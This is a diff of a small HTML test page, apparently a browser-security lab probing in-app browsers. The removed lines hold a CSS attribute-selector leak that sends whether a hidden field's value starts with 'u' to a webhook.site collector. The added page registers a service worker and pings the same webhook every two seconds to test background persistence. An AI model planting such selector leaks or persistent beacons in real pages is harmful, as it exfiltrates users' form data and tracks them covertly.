@@ -1,12 +1,45 @@
-<div class="card">
-    <h3>Automated UI Scraper (CSS)</h3>
-    <input type="text" id="auto_id" value="user_12345" style="display:none;">
-    <p id="result">Scanning for auto-filled data...</p>
-</div>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meta Persistence Lab</title>
+</head>
+<body style="background:#000; color:#0f0; font-family:monospace; padding:20px;">
 
-<style>
-    /* Agar value 'u' se start hoti hai, toh humein pata chal jayega */
-    #auto_id[value^="u"] { 
-        background-image: url("https://webhook.site/7a9ce72c-38b6-4f91-a1b8-5bea8d85797d?leak=starts_with_u"); 
-    }
-</style>
+    <h3>Meta Background Persistence Test</h3>
+    <button onclick="registerServiceWorker()" style="padding:10px; width:100%;">1. Register Service Worker</button>
+    <button onclick="pingContinuous()" style="padding:10px; width:100%; margin-top:10px;">2. Start Continuous Ping</button>
+
+    <p id="status">Status: Idle</p>
+
+    <script>
+        const WEBHOOK = "https://webhook.site/7a9ce72c-38b6-4f91-a1b8-5bea8d85797d";
+
+        function log(m) { document.getElementById('status').innerText = m; }
+
+        // 1. Service Worker Registration
+        async function registerServiceWorker() {
+            if ('serviceWorker' in navigator) {
+                try {
+                    // Ek basic worker register karo (ye aapke server pe sw.js hona chahiye)
+                    const reg = await navigator.serviceWorker.register('sw.js');
+                    log("Service Worker Registered!");
+                    fetch(WEBHOOK + "?sw=success");
+                } catch (e) {
+                    log("SW Failed: " + e.message);
+                }
+            } else {
+                log("Service Workers not supported in this IAB.");
+            }
+        }
+
+        // 2. Continuous Ping (Check if it survives in background)
+        function pingContinuous() {
+            log("Pinging every 2 seconds...");
+            setInterval(() => {
+                fetch(WEBHOOK + "?status=alive&time=" + Date.now(), {mode: 'no-cors'});
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
